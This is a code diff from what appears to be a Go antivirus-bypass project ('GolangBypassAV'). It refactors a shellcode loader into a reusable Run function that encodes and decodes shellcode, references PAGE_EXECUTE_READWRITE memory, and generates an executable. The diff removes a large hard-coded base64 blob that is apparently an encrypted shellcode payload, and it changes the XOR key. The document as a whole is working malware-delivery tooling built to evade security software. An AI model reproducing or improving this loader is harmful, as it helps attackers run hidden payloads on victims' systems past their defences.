@@ -1,4 +1,4 @@
-package main
+package shellcode
 
 import (
 	"GolangBypassAV/encry"
@@ -16,7 +16,7 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
-var kk = []byte{0x21}
+var kk = []byte{0x12}
 
 func base64Decode(data string) []byte {
 	data1, _ := base64.StdEncoding.DecodeString(data)
@@ -112,13 +112,14 @@ func getFileShellCode1(file string) string {
 	return shellCodeHex
 }
 
-func main() {
+func Run(string2 []byte) {
 	//fmt.Println(1)
 
 	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))
 
-	bbdata := "QFZ6VUZhVYCKUlJSUlZXY2JnU2RmZ2taXnVbfWRahWRqVnpdZnl5WnpCWnhkWoWKZlZ4YYVBgVxlZVlbZFVZUoNViXl3UlqEWlZZU4piQlNSdFl6SGdbU2Zmel1melRdYnuJWlJ1U354aXhqVIhbQnSAhlJ6UlJSUlZ6V4hZY39kUlliZlqFWlhWZF1iVFNbUnVVe2d8e0CKZlhdX1p5WlJ1a19edH1aXnRUhGJ0WVtVZlZTiGV7eHV3V15SQYh8VFZmRkFpaWpoVmRdYlRjW1J1U35iaoReZFZkXWJTiVtSdVNTeohkWmRSWWJiZ3lTaFdGa2h8V2piZ31TaHx6VUhUU1Nmh0B4aFZXa2h8el1Whn1hQEBAQGlogFJkc0ZEcmhGgXN+Z0FSVldoZGp/fmVaf4lic4FedYpqWUBKZ1pedH1aXnVbX150U19edH1TZlZXYmJzgEdnf35/QEppg3RCgVp6dFdThlRSVVJSU19edH1TZmZXY3J4X1NmZlhHZ0V+d4mHQGdHQn1zZFp/U2RVWWRkan9qZWVZW2Z+eFJSfFRWZn1bU4aGhWdde4dAQmZ6W4l8elWIQlOCVH1KWnp3V1p6dYFbiUlVQEBAQEBlZVlbZn1bU4Z6QVhYWYdAQmppUlVFaHVSYlJSZGFAYVVFZF5SYlJSR0phgUZSVlJSYHp6QEBAQF1EfUdfi15SfGtoZ3VVdWZScnpKgHJlW1eBRlOFhkaAalZfhmJzc0J5gF14a4p+QHmDemZFd0d8X0mFfWmIi31HcoJYf3mIamSIYIODX15GQGKGYXN4Z1dkf4tHSIZiRIl6ZWpJhINbdlJTZ3RDZ4pdZld/a2hGQWB6U19zRIGBc1iJeV2LZoZeVFKAakNKhXRYV0FyaFuEa2WEeGVnX1tjZFJGXXtSSFpZV3xraV+DWlVahl9URYlee2qLXXtaiF6LhHhnQ32Ga1hKRHSKU2BnVFJDXXtWSFpXdWFni2pBYIpTZnR+fXxraEZBXYtmhl5UfF9UeFJpaX9Dh0JIc2dUSF92il9ci19nQ4lFa0p+g3t6f0iKiWRkfmlnQ35ad3J6UouFglNog3VaXHRagEpaYEpBf4hpfXuLYXR7RXpKZlVqZmJTa2JKSEBZaEB+WXuJholGaEZkRohUZIFCRFViSGWIY354c1aIRVNSiFlIRWN5YXiHfHJDRYE8doRgflxXRX5KSnVnSUqFW3pZeHqEVmlaWkNBRH6Gi4ZeY4hWaH2Ee1hdYWB6X0VBfmBbd1l7Q3xkh1pHWkFKaIBHYmZ3RFV2dEZnWGGJe1lIfkOHc1Z0Z0dzQXeAg4BJVFyKdWSJWkhocoVIWn1lWGeJgXp2gUaDW35nX1mDRXVFi1pSYnNIiIVyW2hASmdaXnR+R1JSU1JSVlhFUlNSUlJWWEZiUlJSUlZYR2hcY2VGd0BnZFtfZWZBeltGQXpbSWZ6W0N8WEVSVFJSUlZ+WzxmWEdWgXJbRYdAZ2RaYVZaWmlSdV1rfnqIdVpSdGBXiFlpaWhXeWpkUmZSUlJSUmZeYYB/QERAQItWil56RUZde1ZCX4pFiV57WlJWe2NodlJOTg=="
-	shellCodeHex := getDeCode(bbdata)
+	dd := getEnCode(string2)
+
+	shellCodeHex := getDeCode(dd)
 	gd()
 	genEXE(shellCodeHex)
 }
